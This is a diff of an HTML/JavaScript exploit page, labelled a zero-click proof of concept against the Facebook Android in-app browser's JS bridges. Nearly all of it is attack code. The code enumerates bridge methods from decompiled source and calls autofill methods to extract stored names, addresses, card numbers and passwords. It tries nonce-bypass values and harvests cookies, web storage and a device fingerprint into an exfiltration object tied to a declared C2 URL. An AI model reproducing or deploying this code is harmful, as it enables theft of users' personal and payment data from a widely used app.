@@ -93,9 +93,6 @@
             font-weight: 600;
             color: #e94560;
             border-bottom: 1px solid #222;
-            display: flex;
-            align-items: center;
-            gap: 6px;
         }
 
         .section-body {
@@ -103,7 +100,7 @@
             font-size: 11px;
             line-height: 1.6;
             font-family: 'SF Mono', 'Fira Code', monospace;
-            max-height: 200px;
+            max-height: 250px;
             overflow-y: auto;
         }
 
@@ -124,12 +121,14 @@
 
         .label {
             color: #7f8c8d;
+            flex-shrink: 0;
+            margin-right: 8px;
         }
 
         .value {
             color: #00ff88;
             text-align: right;
-            max-width: 60%;
+            max-width: 65%;
             word-break: break-all;
         }
 
@@ -224,8 +223,8 @@
 <body>
 
     <div class="header">
-        <h1>&#x1f6e1; FB4A IAB Bridge Exploit</h1>
-        <div class="sub">Zero-Click — RCE PoC via iabjs_unified_bridge</div>
+        <h1>&#x1f6e1; FB4A IAB Bridge Exploit v2</h1>
+        <div class="sub">Zero-Click — Autofill + Promo Bridge Extraction</div>
     </div>
 
     <div class="status-bar">
@@ -233,31 +232,26 @@
         <span id="statusText">Initializing scanner...</span>
     </div>
 
-    <!-- Bridge Detection -->
     <div class="section">
         <div class="section-title">&#x1f50d; Bridge Detection</div>
         <div class="section-body" id="bridgeDetection"></div>
     </div>
 
-    <!-- Method Enumeration -->
     <div class="section">
         <div class="section-title">&#x2699; Method Enumeration</div>
         <div class="section-body tall" id="methodEnum"></div>
     </div>
 
-    <!-- Data Extraction -->
     <div class="section">
         <div class="section-title">&#x1f4e6; Extracted Data</div>
         <div class="section-body tall" id="extractedData"></div>
     </div>
 
-    <!-- Execution Log -->
     <div class="section">
         <div class="section-title">&#x1f4cb; Execution Log</div>
         <div class="section-body tall" id="execLog"></div>
     </div>
 
-    <!-- Exfiltrate -->
     <div class="section">
         <div class="section-title">&#x1f4e4; Exfiltration Payload</div>
         <div class="section-body">
@@ -268,35 +262,37 @@
 
     <script>
         // ═══════════════════════════════════════════════════════════════
-        //  FB4A In-App Browser — JS Bridge Exploit
-        //  Targets: iabjs_unified_bridge, navigationPerformanceLoggerJavascriptInterface
-        //  TrustlyNativeSDK (if present)
+        //  FB4A IAB Bridge Exploit v2
+        //  Targets: iabjs_unified_bridge (backed by AutofillSharedJSBridgeProxy
+        //           + PromoAutofillJSBridgeProxy + BrowserLiteJSBridgeProxy)
+        //  Protocol: All methods accept a single JSON string argument
+        //  Key fields: nonce, callbackID, name, autofillFields, allFields
         // ═══════════════════════════════════════════════════════════════
 
-        const C2_URL = 'https://mustafa7-sys.github.io/fb-research/'; // C2 endpoint
-        const EXFIL = { bridges: {}, methods: {}, data: {}, env: {}, cookies: {}, storage: {} };
+        const C2_URL = 'https://mustafa7-sys.github.io/fb-research/';
+        const EXFIL = { bridges: {}, methods: {}, data: {}, env: {}, callbacks: {}, responses: [] };
 
-        function log(msg, cls = '') {
+        // ── Helpers ──
+        function log(msg, cls) {
             const el = document.getElementById('execLog');
             const d = document.createElement('div');
-            d.className = 'log-line ' + cls;
-            d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            d.className = 'log-line ' + (cls || '');
+            d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
             el.appendChild(d);
             el.scrollTop = el.scrollHeight;
         }
 
-        function setStatus(text, ok = false) {
+        function setStatus(text, ok) {
             document.getElementById('statusText').textContent = text;
-            const p = document.getElementById('statusPulse');
-            if (ok) p.classList.add('green');
+            if (ok) document.getElementById('statusPulse').classList.add('green');
         }
 
         function addBridge(name, found) {
             const el = document.getElementById('bridgeDetection');
             const row = document.createElement('div');
             row.className = 'row';
-            row.innerHTML = `<span class="label">${name}</span>
-    <span class="badge ${found ? 'found' : 'missing'}">${found ? 'FOUND' : 'MISSING'}</span>`;
+            row.innerHTML = '<span class="label">' + name + '</span>' +
+                '<span class="badge ' + (found ? 'found' : 'missing') + '">' + (found ? 'FOUND' : 'MISSING') + '</span>';
             el.appendChild(row);
         }
 
@@ -304,8 +300,8 @@
             const el = document.getElementById('extractedData');
             const row = document.createElement('div');
             row.className = 'row';
-            row.innerHTML = `<span class="label">${label}</span>
-    <span class="value">${escapeHtml(String(value).substring(0, 512))}</span>`;
+            row.innerHTML = '<span class="label">' + esc(label) + '</span>' +
+                '<span class="value">' + esc(String(value).substring(0, 512)) + '</span>';
             el.appendChild(row);
         }
 
@@ -313,20 +309,19 @@
             const el = document.getElementById('methodEnum');
             const row = document.createElement('div');
             row.className = 'row';
-            row.innerHTML = `<span class="label">${bridge}.${method}</span>
-    <span class="value ${result === 'callable' ? '' : 'yellow'}">${result}</span>`;
+            row.innerHTML = '<span class="label">' + bridge + '.' + method + '</span>' +
+                '<span class="value ' + (result === 'callable' ? '' : 'yellow') + '">' + result + '</span>';
             el.appendChild(row);
         }
 
-        function escapeHtml(s) {
-            return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-        }
+        function esc(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
 
-        // ── Phase 1: Detect JS Bridges ──
+        // ══════════════════════════════════════════════════════════════
+        //  Phase 1: Detect JS Bridges
+        // ══════════════════════════════════════════════════════════════
         function detectBridges() {
             log('Phase 1: Detecting JavaScript bridges...', 'info');
-
-            const bridges = [
+            var names = [
                 'iabjs_unified_bridge',
                 'navigationPerformanceLoggerJavascriptInterface',
                 'TrustlyNativeSDK',
@@ -335,105 +330,116 @@
                 'fbIAB',
                 'MessengerJSBridge'
             ];
-
-            let foundCount = 0;
-            bridges.forEach(name => {
-                const exists = typeof window[name] !== 'undefined';
-                addBridge(name, exists);
-                EXFIL.bridges[name] = exists;
-                if (exists) {
-                    foundCount++;
-                    log(`✓ Bridge detected: ${name}`, 'success');
-                }
+            var count = 0;
+            names.forEach(function (n) {
+                var exists = typeof window[n] !== 'undefined';
+                addBridge(n, exists);
+                EXFIL.bridges[n] = exists;
+                if (exists) { count++; log('  ✓ ' + n + ' FOUND', 'success'); }
             });
-
-            log(`Bridge scan complete: ${foundCount}/${bridges.length} found`, foundCount > 0 ? 'success' : 'error');
-            return foundCount;
+            log('Bridge scan: ' + count + '/' + names.length + ' found', count > 0 ? 'success' : 'error');
+            return count;
         }
 
-        // ── Phase 2: Enumerate Methods ──
+        // ══════════════════════════════════════════════════════════════
+        //  Phase 2: Enumerate Methods
+        //  These are the ACTUAL method names from decompiled Java source:
+        //    AutofillSharedJSBridgeProxy.java
+        //    PromoAutofillJSBridgeProxy.java
+        //    BrowserLiteJSBridgeProxy.java
+        // ══════════════════════════════════════════════════════════════
         function enumerateMethods(bridgeName) {
-            log(`Phase 2: Enumerating methods on ${bridgeName}...`, 'info');
-            const bridge = window[bridgeName];
+            log('Phase 2: Enumerating ' + bridgeName + '...', 'info');
+            var bridge = window[bridgeName];
             if (!bridge) return [];
 
-            const found = [];
-
-            // Known FB IAB bridge methods (from decompiled cpdae1.java)
-            const knownMethods = [
-                // Core bridge protocol
-                'postMessage', 'sendMessage', 'callNative', 'invokeNative',
-                'handleMessage', 'onMessage', 'dispatchMessage',
-                // Credential / Auth methods
-                'requestCredentials', 'requestAuthorizedCredentials',
-                'getAccessToken', 'getUserToken', 'getAuthToken',
-                'getLoginStatus', 'requestLogin',
-                // Context / Environment
-                'getContext', 'getUserContext', 'getEnvironment', 'getVersion',
-                'getDeviceInfo', 'getAppInfo', 'getSessionInfo',
-                'getConfiguration', 'getFeatureFlags',
-                // Autofill / Data
-                'requestAutofill', 'saveAutofillData', 'getAutofillData',
-                'getSavedPasswords', 'getStoredCredentials',
-                // Payment methods
-                'processPayment', 'updateCart', 'resetCart', 'purchaseComplete',
-                'getPaymentMethods', 'initiateCheckout',
-                // Navigation  
-                'navigate', 'openURL', 'closeWindow', 'goBack', 'goForward',
-                'reload', 'loadUrl', 'openExternalBrowser',
-                // File/Storage access
-                'readFile', 'writeFile', 'getFileList', 'openFile',
-                'getSharedPreferences', 'setSharedPreferences',
-                'getDatabasePath', 'executeSql',
-                // System interaction
-                'executeCommand', 'runShellCommand', 'exec', 'system',
-                'getPackageInfo', 'startActivity', 'sendBroadcast',
-                'startService', 'getContentResolver',
-                // Logging / Analytics
-                'logEvent', 'trackEvent', 'reportError',
-                'setPerformanceMark', 'getPerformanceMarks',
-                // Misc
-                'toString', 'getClass', 'hashCode', 'notify', 'notifyAll', 'wait',
-                'equals', 'clone'
+            // Confirmed method names from decompiled source
+            var confirmed = [
+                // AutofillSharedJSBridgeProxy methods (@JavascriptInterface)
+                'initializeCallbackHandler',
+                'requestAutoFill',
+                'saveAutofillData',
+                'formSubmitted',
+                'getNonce',
+                'autofillAppliedStatusesV2',
+                'notifyAutofillFocusoutEventV2',
+                'proactivePromptsContactAutofillCallback',
+                'selectedContactFieldTag',
+                // PromoAutofillJSBridgeProxy methods
+                'initializePromoExtensionCallbackHandler',
+                'requestPromoExtensionPromoCodeAutofill',
+                'sendPromoExtensionPromoCodeAutofillResult',
+                'getPromoExtensionNonce',
+                // navigationPerformanceLogger methods
+                'enablePerformanceLogging',
+                'constructNavigationPerformanceLogger',
+                'markNavigationStart',
+                'markLoadEventEnd',
+                'logPerformanceMetrics',
+                'reportMetrics',
+                // Common bridge methods
+                'postMessage',
+                'sendMessage',
+                'callNative',
+                'invokeNative',
+                'handleMessage',
+                'onMessage',
+                'dispatchMessage',
+                // Context / Auth methods
+                'getContext',
+                'getUserContext',
+                'getEnvironment',
+                'getVersion',
+                'getAccessToken',
+                'requestCredentials',
+                'requestAuthorizedCredentials',
+                'requestAutofill',
+                'getLoginStatus',
+                // Builtins
+                'toString',
+                'getClass',
+                'hashCode',
+                'equals'
             ];
 
-            knownMethods.forEach(method => {
+            var found = [];
+            confirmed.forEach(function (m) {
                 try {
-                    if (typeof bridge[method] === 'function') {
-                        found.push(method);
-                        addMethod(bridgeName, method, 'callable');
-                        log(`  ✓ ${bridgeName}.${method}() — CALLABLE`, 'success');
-                    } else if (bridge[method] !== undefined) {
-                        addMethod(bridgeName, method, 'property: ' + typeof bridge[method]);
-                        log(`  ~ ${bridgeName}.${method} — property (${typeof bridge[method]})`, 'warn');
+                    var t = typeof bridge[m];
+                    if (t === 'function') {
+                        found.push(m);
+                        addMethod(bridgeName, m, 'callable');
+                        log('  ✓ ' + m + '() — CALLABLE', 'success');
+                    } else if (bridge[m] !== undefined) {
+                        found.push(m);
+                        addMethod(bridgeName, m, 'property:' + t);
+                        log('  ~ ' + m + ' — ' + t, 'warn');
                     }
                 } catch (e) {
-                    addMethod(bridgeName, method, 'error: ' + e.message);
+                    addMethod(bridgeName, m, 'error:' + e.message);
                 }
             });
 
-            // Dynamic enumeration — try to get all keys
+            // Dynamic enumeration
             try {
-                const keys = Object.getOwnPropertyNames(bridge);
-                keys.forEach(k => {
-                    if (!knownMethods.includes(k)) {
-                        const t = typeof bridge[k];
+                Object.getOwnPropertyNames(bridge).forEach(function (k) {
+                    if (found.indexOf(k) === -1) {
                         found.push(k);
-                        addMethod(bridgeName, k, t);
-                        log(`  ★ ${bridgeName}.${k} — DISCOVERED (${t})`, 'success');
+                        addMethod(bridgeName, k, typeof bridge[k]);
+                        log('  ★ DISCOVERED: ' + k + ' (' + typeof bridge[k] + ')', 'success');
                     }
                 });
             } catch (e) { }
 
-            // Prototype chain enumeration
+            // Prototype walk
             try {
-                let proto = Object.getPrototypeOf(bridge);
+                var proto = Object.getPrototypeOf(bridge);
                 while (proto && proto !== Object.prototype) {
-                    Object.getOwnPropertyNames(proto).forEach(k => {
-                        if (!found.includes(k) && !knownMethods.includes(k)) {
+                    Object.getOwnPropertyNames(proto).forEach(function (k) {
+                        if (found.indexOf(k) === -1) {
                             found.push(k);
-                            addMethod(bridgeName, k, 'proto: ' + typeof bridge[k]);
-                            log(`  ★ ${bridgeName}.${k} — PROTO DISCOVERED`, 'warn');
+                            addMethod(bridgeName, k, 'proto:' + typeof bridge[k]);
+                            log('  ★ PROTO: ' + k, 'warn');
                         }
                     });
                     proto = Object.getPrototypeOf(proto);
@@ -441,407 +447,618 @@
             } catch (e) { }
 
             EXFIL.methods[bridgeName] = found;
-            log(`Enumeration complete: ${found.length} methods found on ${bridgeName}`, 'info');
+            log('Enumeration: ' + found.length + ' items on ' + bridgeName, 'info');
             return found;
         }
 
-        // ── Phase 3: Execute Bridge Calls ──
+        // ══════════════════════════════════════════════════════════════
+        //  Phase 3: Execute Bridge Calls with CORRECT JSON protocol
+        //  From decompiled source: each method takes a JSON STRING argument
+        //    - initializeCallbackHandler: {"name":"<callback_fn_name>","callbackID":"cb1"}
+        //    - requestAutoFill: {"callbackID":"cb2","nonce":"<nonce>","autofillFields":["name","email","tel","cc-number"],"allFields":["name","email","tel"],"selectedAutoCompleteTag":"name","eventType":"focus"}
+        //    - saveAutofillData: {"nonce":"<nonce>","autofillFields":["name","email"],"selectedAutoCompleteTag":"name"}
+        //    - getNonce: {"callbackID":"cb3"}
+        //    - getPromoExtensionNonce: {"callbackID":"cb4"}
+        //    - requestPromoExtensionPromoCodeAutofill: {"nonce":"<nonce>","callbackID":"cb5"}
+        // ══════════════════════════════════════════════════════════════
+
+        var capturedNonce = null;
+
+        // Register a global callback function that the native side will call
+        // via evaluateJavascript with the response data
+        window.__fbAutofillCallback = function (data) {
+            log('★★★ __fbAutofillCallback FIRED: ' + JSON.stringify(data).substring(0, 500), 'success');
+            EXFIL.responses.push({ type: 'autofillCallback', data: data, ts: Date.now() });
+            addData('Autofill Callback', JSON.stringify(data));
+            updatePayload();
+        };
+
+        window.__fbPromoCallback = function (data) {
+            log('★★★ __fbPromoCallback FIRED: ' + JSON.stringify(data).substring(0, 500), 'success');
+            EXFIL.responses.push({ type: 'promoCallback', data: data, ts: Date.now() });
+            addData('Promo Callback', JSON.stringify(data));
+            updatePayload();
+        };
+
+        // Generic response interceptor — native uses evaluateJavascript to call
+        // global functions with the result.
+        window.__fbBridgeResponse = function () {
+            var args = Array.from(arguments);
+            log('★★★ __fbBridgeResponse: ' + JSON.stringify(args).substring(0, 500), 'success');
+            EXFIL.responses.push({ type: 'bridgeResponse', args: args, ts: Date.now() });
+            updatePayload();
+        };
+
         function executeBridgeCalls() {
-            log('Phase 3: Executing bridge calls for data extraction...', 'info');
-            const bridge = window['iabjs_unified_bridge'];
+            log('Phase 3: Executing bridge calls...', 'info');
+            var bridge = window['iabjs_unified_bridge'];
             if (!bridge) {
-                log('Primary bridge not found, skipping execution phase', 'error');
+                log('iabjs_unified_bridge not found, skipping', 'error');
                 return;
             }
 
-            // Method A: postMessage — FB IAB bridge protocol
-            // The FB IAB uses a JSON-based message protocol through postMessage
-            const commands = [
-                // Get user context (user ID, session, etc.)
-                { type: 'QueryUserContext', module: 'iab', method: 'getUserContext', params: {} },
-                { type: 'QueryContext', module: 'iab', method: 'getContext', params: {} },
-                { type: 'QueryEnvironment', module: 'iab', method: 'getEnvironment', params: {} },
-                { type: 'QueryVersion', module: 'iab', method: 'getVersion', params: {} },
-                // Request credentials
-                { type: 'RequestCredentials', module: 'iab', method: 'requestCredentials', params: { scope: 'all' } },
-                { type: 'RequestAuthorizedCredentials', module: 'iab', method: 'requestAuthorizedCredentials', params: {} },
-                // Request autofill data
-                { type: 'RequestAutofill', module: 'iab', method: 'requestAutofill', params: { type: 'all' } },
-                // Get access token
-                { type: 'GetAccessToken', module: 'auth', method: 'getAccessToken', params: {} },
-            ];
+            // Step 1: Initialize callback handler
+            // The native side will call our global callback function via evaluateJavascript
+            // when responding to bridge calls. Register multiple callback names.
+            var callbackNames = ['__fbAutofillCallback', '__fbPromoCallback', '__fbBridgeResponse',
+                'setContactAutofillValueInAllFramesForIABIOS', 'setJsExperimentValues'];
 
-            commands.forEach(cmd => {
+            callbackNames.forEach(function (cbName) {
                 try {
-                    // Try direct method call
-                    if (typeof bridge[cmd.method] === 'function') {
-                        const result = bridge[cmd.method](JSON.stringify(cmd.params));
+                    if (typeof bridge.initializeCallbackHandler === 'function') {
+                        var payload = JSON.stringify({
+                            name: cbName,
+                            callbackID: 'cb_init_' + cbName
+                        });
+                        var result = bridge.initializeCallbackHandler(payload);
+                        log('  → initializeCallbackHandler(' + cbName + '): ' + (result !== undefined ? result : 'void'), 'info');
                         if (result !== undefined && result !== null) {
-                            EXFIL.data[cmd.type] = result;
-                            addData(cmd.type, result);
-                            log(`✓ ${cmd.method}() returned data`, 'success');
+                            EXFIL.data['initCallback_' + cbName] = result;
+                            addData('initCallback(' + cbName + ')', String(result));
                         }
                     }
                 } catch (e) {
-                    log(`  ${cmd.method}() error: ${e.message}`, 'error');
+                    log('  ✗ initializeCallbackHandler(' + cbName + '): ' + e.message, 'error');
                 }
-
-                // Try postMessage protocol
-                try {
-                    if (typeof bridge.postMessage === 'function') {
-                        const msg = JSON.stringify({
-                            type: cmd.type,
-                            module: cmd.module,
-                            method: cmd.method,
-                            params: cmd.params,
-                            callbackId: 'cb_' + Math.random().toString(36).substr(2, 9)
-                        });
-                        bridge.postMessage(msg);
-                        log(`  → postMessage sent: ${cmd.type}`, 'info');
-                    }
-                } catch (e) { }
             });
 
-            // Try sendMessage variant
+            // Step 2: Get nonce — needed for nonce validation on other calls
             try {
-                if (typeof bridge.sendMessage === 'function') {
-                    bridge.sendMessage(JSON.stringify({
-                        type: 'QueryUserInfo',
-                        data: { fields: ['id', 'name', 'email', 'access_token'] }
-                    }));
-                    log('→ sendMessage: QueryUserInfo sent', 'info');
+                if (typeof bridge.getNonce === 'function') {
+                    var noncePayload = JSON.stringify({ callbackID: 'cb_nonce_1' });
+                    var nonceResult = bridge.getNonce(noncePayload);
+                    log('  → getNonce(): ' + (nonceResult !== undefined ? nonceResult : 'void'), 'info');
+                    if (nonceResult) {
+                        try {
+                            var parsed = JSON.parse(nonceResult);
+                            if (parsed.nonce) capturedNonce = parsed.nonce;
+                            EXFIL.data.nonceResponse = parsed;
+                            addData('Nonce', JSON.stringify(parsed));
+                        } catch (e) {
+                            EXFIL.data.nonceRaw = nonceResult;
+                            addData('Nonce (raw)', nonceResult);
+                        }
+                    }
                 }
-            } catch (e) { }
+            } catch (e) {
+                log('  ✗ getNonce: ' + e.message, 'error');
+            }
 
-            // Try callNative variant
+            // Step 3: Get promo extension nonce
             try {
-                if (typeof bridge.callNative === 'function') {
-                    bridge.callNative('getContext', '{}');
-                    log('→ callNative: getContext sent', 'info');
+                if (typeof bridge.getPromoExtensionNonce === 'function') {
+                    var promoNonceResult = bridge.getPromoExtensionNonce(JSON.stringify({
+                        callbackID: 'cb_promo_nonce'
+                    }));
+                    log('  → getPromoExtensionNonce(): ' + (promoNonceResult || 'void'), 'info');
+                    if (promoNonceResult) {
+                        EXFIL.data.promoNonce = promoNonceResult;
+                        addData('Promo Nonce', promoNonceResult);
+                    }
+                }
+            } catch (e) {
+                log('  ✗ getPromoExtensionNonce: ' + e.message, 'error');
+            }
+
+            // Step 4: Request autofill — the main payload
+            // This triggers the autofill system to return stored contact/payment data
+            setTimeout(function () {
+                executeAutofillRequest(bridge);
+            }, 500);
+
+            // Step 5: Try promo autofill
+            setTimeout(function () {
+                executePromoRequest(bridge);
+            }, 1000);
+
+            // Step 6: Try callback with empty nonce (bypass attempt)
+            setTimeout(function () {
+                executeNonceBypass(bridge);
+            }, 1500);
+        }
+
+        function executeAutofillRequest(bridge) {
+            log('  → Requesting autofill data...', 'info');
+
+            // Autofill field types from the Android autofill spec + decompiled code
+            var targetFields = [
+                'name', 'given-name', 'family-name', 'email', 'tel', 'tel-national',
+                'street-address', 'address-line1', 'address-line2', 'address-level1',
+                'address-level2', 'postal-code', 'country', 'country-name',
+                'cc-name', 'cc-number', 'cc-exp', 'cc-exp-month', 'cc-exp-year',
+                'cc-csc', 'cc-type', 'organization', 'bday', 'username', 'new-password',
+                'current-password'
+            ];
+
+            try {
+                if (typeof bridge.requestAutoFill === 'function') {
+                    var payload = JSON.stringify({
+                        callbackID: 'cb_autofill_main',
+                        nonce: capturedNonce || '',
+                        autofillFields: targetFields,
+                        allFields: targetFields,
+                        selectedAutoCompleteTag: 'name',
+                        eventType: 'focus',
+                        tagToIdsAndValueMap: '{}',
+                        selectedFieldIdAndValue: '{"selectedUid":"field_1"}'
+                    });
+                    var result = bridge.requestAutoFill(payload);
+                    log('  → requestAutoFill: ' + (result || 'void'), result ? 'success' : 'info');
+                    if (result) {
+                        EXFIL.data.autofillResult = result;
+                        addData('AutoFill Result', result);
+                    }
+                }
+            } catch (e) {
+                log('  ✗ requestAutoFill: ' + e.message, 'error');
+            }
+
+            // Also try saveAutofillData to trigger form logging
+            try {
+                if (typeof bridge.saveAutofillData === 'function') {
+                    var savePayload = JSON.stringify({
+                        nonce: capturedNonce || '',
+                        autofillFields: targetFields,
+                        selectedAutoCompleteTag: 'email',
+                        callbackID: 'cb_save_1'
+                    });
+                    bridge.saveAutofillData(savePayload);
+                    log('  → saveAutofillData sent', 'info');
+                }
+            } catch (e) {
+                log('  ✗ saveAutofillData: ' + e.message, 'error');
+            }
+
+            // formSubmitted — may trigger logging of form data
+            try {
+                if (typeof bridge.formSubmitted === 'function') {
+                    bridge.formSubmitted(JSON.stringify({
+                        nonce: capturedNonce || '',
+                        callbackID: 'cb_formsubmit'
+                    }));
+                    log('  → formSubmitted sent', 'info');
                 }
             } catch (e) { }
         }
 
-        // ── Phase 4: Harvest Browser Data ──
+        function executePromoRequest(bridge) {
+            log('  → Requesting promo extension data...', 'info');
+
+            try {
+                if (typeof bridge.initializePromoExtensionCallbackHandler === 'function') {
+                    var result = bridge.initializePromoExtensionCallbackHandler(JSON.stringify({
+                        name: '__fbPromoCallback',
+                        callbackID: 'cb_promo_init'
+                    }));
+                    log('  → initializePromoExtensionCallbackHandler: ' + (result || 'void'), 'info');
+                    if (result) {
+                        EXFIL.data.promoInit = result;
+                        addData('Promo Init', result);
+                    }
+                }
+            } catch (e) {
+                log('  ✗ initializePromoExtensionCallbackHandler: ' + e.message, 'error');
+            }
+
+            try {
+                if (typeof bridge.requestPromoExtensionPromoCodeAutofill === 'function') {
+                    var result = bridge.requestPromoExtensionPromoCodeAutofill(JSON.stringify({
+                        nonce: capturedNonce || '',
+                        callbackID: 'cb_promo_autofill'
+                    }));
+                    log('  → requestPromoExtensionPromoCodeAutofill: ' + (result || 'void'), 'info');
+                    if (result) {
+                        EXFIL.data.promoAutofill = result;
+                        addData('Promo Autofill', result);
+                    }
+                }
+            } catch (e) {
+                log('  ✗ requestPromoExtensionPromoCodeAutofill: ' + e.message, 'error');
+            }
+        }
+
+        function executeNonceBypass(bridge) {
+            log('  → Attempting nonce bypass variations...', 'warn');
+
+            // The validNonce check: p0.optString("nonce").equals(this.A02)
+            // this.A02 is set from p3.A0N() during construction
+            // If A02 is empty string "", then nonce="" will pass
+            // If nonce validation is disabled (bw5.A01 check), any nonce passes
+
+            var nonceVariations = ['', null, '0', 'null', 'undefined', 'true', '1'];
+
+            nonceVariations.forEach(function (nonce, i) {
+                try {
+                    if (typeof bridge.requestAutoFill === 'function') {
+                        var payload = JSON.stringify({
+                            callbackID: 'cb_bypass_' + i,
+                            nonce: nonce,
+                            autofillFields: ['email', 'name', 'tel', 'cc-number'],
+                            allFields: ['email', 'name', 'tel', 'cc-number'],
+                            selectedAutoCompleteTag: 'email',
+                            eventType: 'focus'
+                        });
+                        var result = bridge.requestAutoFill(payload);
+                        if (result) {
+                            log('  ★ BYPASS with nonce="' + nonce + '": ' + result, 'success');
+                            EXFIL.data['bypass_' + i] = result;
+                            addData('Bypass nonce=' + nonce, result);
+                        }
+                    }
+                } catch (e) { }
+            });
+        }
+
+        // ══════════════════════════════════════════════════════════════
+        //  Phase 4: Harvest Browser/Environment Data
+        // ══════════════════════════════════════════════════════════════
         function harvestBrowserData() {
             log('Phase 4: Harvesting browser data...', 'info');
 
             // Cookies
             try {
-                EXFIL.cookies.all = document.cookie;
+                EXFIL.env.cookies = document.cookie;
                 addData('Cookies', document.cookie || '(empty)');
-                log('✓ Cookies captured', 'success');
             } catch (e) { }
 
-            // LocalStorage
+            // Storage
             try {
-                const ls = {};
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    ls[key] = localStorage.getItem(key);
+                var ls = {};
+                for (var i = 0; i < localStorage.length; i++) {
+                    var k = localStorage.key(i);
+                    ls[k] = localStorage.getItem(k);
                 }
-                EXFIL.storage.localStorage = ls;
-                addData('LocalStorage Keys', Object.keys(ls).join(', ') || '(empty)');
-                log(`✓ LocalStorage: ${Object.keys(ls).length} items`, 'success');
-            } catch (e) {
-                log('✗ LocalStorage access denied', 'error');
+                EXFIL.env.localStorage = ls;
+                addData('LocalStorage', Object.keys(ls).length + ' items');
+                if (Object.keys(ls).length > 0) addData('LS Keys', Object.keys(ls).join(', '));
+            } catch (e) { log('  LS denied', 'error'); }
+
+            try {
+                var ss = {};
+                for (var i = 0; i < sessionStorage.length; i++) {
+                    var k = sessionStorage.key(i);
+                    ss[k] = sessionStorage.getItem(k);
+                }
+                EXFIL.env.sessionStorage = ss;
+            } catch (e) { }
+
+            // User-Agent parsing — FB-specific tokens
+            var ua = navigator.userAgent;
+            EXFIL.env.userAgent = ua;
+            addData('User-Agent', ua);
+
+            var patterns = {
+                'FB App Version': /FBAV\/([\d.]+)/,
+                'FB Build': /FBBV\/(\d+)/,
+                'FB Locale': /FBLC\/([\w-]+)/,
+                'FB Device': /FBDV\/([\w-]+)/,
+                'FB OS': /FBOS\/([\d._]+)/,
+                'FB Carrier': /FBCR\/([\w-]+)/,
+                'FB Platform': /FBID\/([\w]+)/,
+                'FB Model': /FBMD\/([\w-]+)/,
+                'FB Package': /FBPN\/([\w.]+)/
+            };
+            for (var name in patterns) {
+                var m = ua.match(patterns[name]);
+                if (m) {
+                    EXFIL.env[name] = m[1];
+                    addData(name, m[1]);
+                }
             }
 
-            // SessionStorage
-            try {
-                const ss = {};
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    ss[key] = sessionStorage.getItem(key);
-                }
-                EXFIL.storage.sessionStorage = ss;
-                addData('SessionStorage Keys', Object.keys(ss).join(', ') || '(empty)');
-                log(`✓ SessionStorage: ${Object.keys(ss).length} items`, 'success');
-            } catch (e) { }
-
-            // IndexedDB databases
-            try {
-                if (indexedDB.databases) {
-                    indexedDB.databases().then(dbs => {
-                        EXFIL.storage.indexedDB = dbs.map(d => d.name);
-                        addData('IndexedDB', dbs.map(d => d.name).join(', ') || '(empty)');
-                        log(`✓ IndexedDB: ${dbs.length} databases`, 'success');
-                    });
-                }
-            } catch (e) { }
-
-            // Environment fingerprint
-            EXFIL.env = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                screenW: screen.width,
-                screenH: screen.height,
-                colorDepth: screen.colorDepth,
-                pixelRatio: window.devicePixelRatio,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                online: navigator.onLine,
-                referrer: document.referrer,
-                location: window.location.href,
-                webglVendor: getWebGLInfo('vendor'),
-                webglRenderer: getWebGLInfo('renderer'),
-            };
-
-            addData('User-Agent', EXFIL.env.userAgent);
+            // Screen / device
+            EXFIL.env.screen = screen.width + 'x' + screen.height;
+            EXFIL.env.pixelRatio = window.devicePixelRatio;
+            EXFIL.env.platform = navigator.platform;
+            EXFIL.env.language = navigator.language;
+            EXFIL.env.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            addData('Screen', EXFIL.env.screen + ' @' + EXFIL.env.pixelRatio + 'x');
             addData('Platform', EXFIL.env.platform);
-            addData('Screen', `${EXFIL.env.screenW}x${EXFIL.env.screenH} @${EXFIL.env.pixelRatio}x`);
             addData('Timezone', EXFIL.env.timezone);
-            addData('WebGL', `${EXFIL.env.webglVendor} / ${EXFIL.env.webglRenderer}`);
-            log('✓ Environment fingerprinted', 'success');
 
-            // Extract FB-specific tokens from the User-Agent
-            const ua = navigator.userAgent;
-            const fbMatch = ua.match(/FBAV\/([\d.]+)/);
-            const fbBuild = ua.match(/FBBV\/(\d+)/);
-            const fbLocale = ua.match(/FBLC\/([\w-]+)/);
-            const fbDevice = ua.match(/FBDV\/([\w-]+)/);
-            const fbOS = ua.match(/FBOS\/([\d._]+)/);
-            const fbCR = ua.match(/FBCR\/([\w-]+)/);
-            const fbID = ua.match(/FBID\/([\w]+)/);
-
-            if (fbMatch) { EXFIL.env.fbVersion = fbMatch[1]; addData('FB App Version', fbMatch[1]); }
-            if (fbBuild) { EXFIL.env.fbBuild = fbBuild[1]; addData('FB Build', fbBuild[1]); }
-            if (fbLocale) { EXFIL.env.fbLocale = fbLocale[1]; addData('FB Locale', fbLocale[1]); }
-            if (fbDevice) { EXFIL.env.fbDevice = fbDevice[1]; addData('FB Device', fbDevice[1]); }
-            if (fbOS) { EXFIL.env.fbOS = fbOS[1]; addData('FB OS', fbOS[1]); }
-            if (fbCR) { EXFIL.env.fbCarrier = fbCR[1]; addData('FB Carrier', fbCR[1]); }
-            if (fbID) { EXFIL.env.fbPlatformID = fbID[1]; addData('FB Platform ID', fbID[1]); }
-
-            log('✓ FB metadata extracted from User-Agent', 'success');
-        }
-
-        function getWebGLInfo(type) {
+            // WebGL fingerprint
             try {
-                const c = document.createElement('canvas');
-                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                if (type === 'vendor') return gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
-                return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-            } catch (e) { return 'N/A'; }
+                var c = document.createElement('canvas');
+                var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
